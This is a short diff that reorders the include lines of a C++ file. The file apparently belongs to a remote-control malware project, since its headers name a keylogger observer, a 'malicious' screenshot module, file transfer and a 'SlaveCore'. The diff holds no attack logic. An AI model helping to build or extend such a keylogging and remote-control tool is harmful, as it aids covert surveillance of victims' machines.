@@ -1,6 +1,3 @@
-#include <winsock2.h>
-#include <windows.h>
-
 #include <string>
 #include <fstream>
 using namespace std;
@@ -11,7 +8,6 @@ using namespace std;
 using namespace System;
 
 #include <blaspheme/transfer/FileTransfer.hpp>
-#include <common/Innocence.hpp>
 using namespace Blaspheme;
 
 #include <malicious/Screenshot.hpp>
@@ -21,6 +17,9 @@ using namespace Malicious;
 
 #include <keyboard/KeyLogObserver.hpp>
 using namespace Keyboard;
+
+#include <common/WindowsWrapper.hpp>
+#include <common/Innocence.hpp>
 
 #include "RemoteControlFunctions.hpp"
 #include "SlaveCore.hpp"
